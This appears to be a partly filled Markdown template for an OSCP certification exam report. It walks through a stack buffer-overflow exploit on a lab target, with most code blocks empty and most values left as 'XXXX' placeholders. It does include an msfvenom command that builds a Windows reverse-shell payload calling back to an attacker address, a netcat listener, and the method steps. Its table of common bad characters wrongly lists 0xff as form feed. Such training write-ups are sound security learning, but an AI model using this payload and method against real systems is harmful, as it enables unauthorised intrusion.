---
title: "Offensive Security Certified Professional Exam Report"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "OSCP Exam Report"
lang: "en"
book: true
classoption: oneside
code-block-font-size: \scriptsize
---

### Introduction
 | | title
----- | -----
ipv4 | 10.10.10.10
dns name | test.oscp


RDP connection:

```
    rdesktop -u admin -p lab 10.10.10.10:3389
```

Below the open ports, based on results from active information gathering scans with NMAP:

Port XXXX is open.


### Writing the exploit

Start with nmap to verify the port is open:
nmap -p- -Pn [ip] > enum/[ip]-nmap.txt


#### Proof of Concept & Replicating the Crash

The goal here is to write an exploit for the buffer overflow vulnerability in the XXXX program, and make the exploit open a reverse shell. The reverse shell will then give me access to the underlying operating system.

The first step with writing a buffer overflow exploit, is replicating a crash.

**1-poc.py**

```py


buffer = cmd + junk + end

```

Result:

This shows at XXXX bytes, the EIP is overwritten, and the program crashes.

#### Finding the Offset

In order to make the program run the code I tell it to run, I will need to control the EIP register.   At this point, I know that the EIP is located somewhere between 1 and 2000 bytes, but i am not sure where it’s located exactly. What I need to do next is figure out exactly where the EIP is located (in bytes). Then I can point it to something i want to run.

I used a tool called Pattern Create and Pattern Offset to find the exact location of the overwrite. Pattern Create allows me to generate a cyclical amount of bytes, based on the number of bytes i specify. I can then send those bytes to the vulnerable program,  and try to find exactly where I overwrote the EIP. Pattern Offset will help me to determine that soon.

I chose to go with XXXX, to be on the safe side. Maybe this will also make it easier to place shellcode.

making the pattern with msf-pattern_create :

```
> msf-pattern_create -l 3000 > pattern.txt
> msf-pattern_offset -l 3000 -q XXXXXX
```

```sh

```

Added the pattern to the code:

**2-findoffset.py**

```py



```

Result in immunity debugger:

So even though I sent XXXX characters instead of XXXX this time, the program still crashed as expected.

The EIP shows: XXXX. I used msf-pattern_offset to find the placement of the characters which have been overwritten the EIP:

#### Overwriting the EIP

Now that i know which characters in the buffer will overwrite the EIP register, I can test this. I will do this by sending XXXX A's, then 4 B's, then the rest of the XXX characters C's. If the EIP shows the value 42424242, which is BBBB in ASCII, then I will know for sure I have control over the EIP register.

**3-overwritingEIP.py**

```python


```


The 4 B's landed exactly on the EIP.


#### Locating Space for Shellcode

If I add shellcode to the script later which I want the program to run, I first need to know where I can place it, and how many characters it can contain.
After the last crash, I can use immunity debugger to see if there is enough space in the C's I sent to put some shellcode. If not, I need to perform a trick and place the code elsewhere.


double click on the first C's:


XXX (in hex) characters for shellspace. That is XXX bytes.
shellcode needs to be XXX bytes maximum.
The ESP points to the 4 bytes directly after the EIP, and from there, I can add a maximum of XXX bytes of nopsled and shellcode. That should be enough. 



#### Finding Bad Characters

Before I can make the shellcode, I need to know if there are any bad characters i need to avoid. Certain byte characters can cause issues in the development of exploits. By running every single byte through the program, I can see if any characters cause issues. By default, the null byte(x00) is always considered a bad character as it will truncate shellcode when executed. To find bad characters in Vulnserver, i added an additional variable of “badchars” to our code that contains a list of every single hex character.

All possible characters:

```
(
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e"
"\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d"
"\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c"
"\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b"
"\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69"
"\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
"\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87"
"\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96"
"\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5"
"\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4"
"\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2"
"\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"
"\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

Some common bad characters:

```
0x00     NULL (\0)
0x09     Tab (\t)
0x0a     Line Feed (\n)
0x0d     Carriage Return (\r)
0xff     Form Feed (\f)
```


**4-testingbadchar.py**


```python


```

After running this, the program crashed when hitting the EIP.
To view the results in the hex dump: Click with the right mouse button on the ESP, and select "Follow in Dump":

Here I can view the characters I send to the program:



If you look at the characters closely, you can see these inconsistencies:



This tells me the following characters are different than expected:


```


```


deleted XXXXXXX in the "badchar" variable and ran again:


**4a-testingbadchar.py**


```py

```

I ran 4a, and viewed the result in hex dump again, no more inconsistencies:

The bad chars are (including the null byte):

```
00, 

```


#### Finding a Return Address

Now I know which characters to avoid. If I want to run the shellcode of our choosing, I need to make the EIP run the code. The easiest way to do that in my opinion, is the JMP ESP command. If I can point to a place in memory containing a JMP ESP command, I can place the shellcode at the place the ESP is pointing at, and make the program run the code of our choosing.
I used mona modules to find a suitable JMP ESP:


```
> msf-nasm_shell
jmp esp = FFE4
jmp eax = FFE0
```

```
> !mona modules
> !mona find -s "\xff\xe4" -m dllname.dll
```

Things like ASLR and other forms of memory protection will only bother me. I need to find some part of the program that does not have any sort of memory protections. Memory protections, such as DEP, ASLR, and SafeSEH can cause headaches. While these protections can be bypassed, they are not in the scope for this lesson.

starting mona modules:


This leaves 2 executables: XXXX and XXXX.
the XXX is loaded when starting XXXX, so this dll is actually part of the program.



XXX JMP ESP commands in XXXX, none in XXXX. Lets try and use the first one found in XXXXX.

```

```
In the code, I need to reverse the order (because of the 32-bit architecture of the program, little endian format)

```
"\x00\x00\x00\x00" 
```

**5-findingjumppoint.py**

```py

```

If I run this, the program will just continue, because the EIP now points at a memory location with a valid command. You can view if the jump works correctly by placing a breakpoint at the JMP ESP in memory. If i do that, the program will stop once that command is about to run.

To test this in immunity, i set the breakpoint at the JMP ESP location in memory:  
CTRL + G, and 
Enter XXXXXXX

Now if the program hits this memory location, the program will pause


F2 to set the breakpoint at that location.


Next i ran the script 5-findingjumppoint.py.
Result:


The EIP points at the right memory location, and the ESP points at the beginning of the C's. Looks like this is going to work.



#### Getting a Reverse Shell on the debugging machine

Now I need to replace the C's with some shellcode which opens a reverse shell to my own machine. 
I used msfvenom from metasploit to make the shellcode:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00" > shellcode.txt

```

Earlier, i determined the maximum space i have for shellcode is XXX bytes, thats within the range of XXX. This payload is XXX bytes, that should fit.


#### Getting a Reverse Shell on the debugging machine

Added the shellcode to the buffer in the next version of my script, after the EIP. Before placing the shellcode i added 16 nop commands, just in case.

**6-exploit.py**

```py

```

Set up a listener:

```sh
nc -nvlp 443  

```

Run the program:

```sh
$ python3 6-exploit.py   

```

The program crashed, but not before it ran the code. the result :

```sh

```


Got a shell back on the listener! That means the exploit is successful.

### Getting a Reverse Shell on the target machine


```sh
nc -nvlp 443  

```

Run the program:

```sh
$ python3 6-exploit.py   

```


```sh
$ whoami && hostname && type Users\admin\Desktop\proof.txt
```




